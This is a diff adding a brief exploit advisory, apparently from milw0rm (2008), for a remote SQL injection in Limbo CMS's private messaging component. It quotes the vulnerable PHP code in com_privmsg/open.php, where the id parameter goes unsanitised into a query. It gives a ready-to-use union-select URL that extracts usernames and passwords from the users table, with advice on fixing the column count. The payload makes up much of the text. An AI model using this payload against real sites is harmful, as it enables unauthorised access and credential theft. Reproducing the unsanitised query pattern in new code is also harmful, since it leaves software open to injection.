@@ -1,0 +1,28 @@
+/*
+   
+   Limbo CMS (Private Messaging Component) Remote SQL Injection Vulnerability
+   --------------------------------------------------------------------------
+   StAkeR[at]hotmail[dot]it
+   http://www.limboportal.com/index.php/option/downloads/task/download/id/108
+   --------------------------------------------------------------------------
+
+   com_privmsg/open.php
+   
+   31. if (isset($_GET['status']))
+   32. {
+   33. 	  header('Location:index.php?option=pms&page=open&id='.$_GET['id'].'');
+   34. }
+   35. 
+   36. $openrow= $conn->GetRow("SELECT * FROM #__pms WHERE id='$_GET[id]' AND username='$my->username'");
+   37.
+   
+   
+   - index.php?option=pms&page=open&id='1+union+all+select+password,username+from+[prefix_users]+where+id=1/*
+   
+   (Syntax Error) Change number of columns (Ex: 0,0,0,username,password) 
+   
+   
+
+*/
+
+# milw0rm.com [2008-10-21]
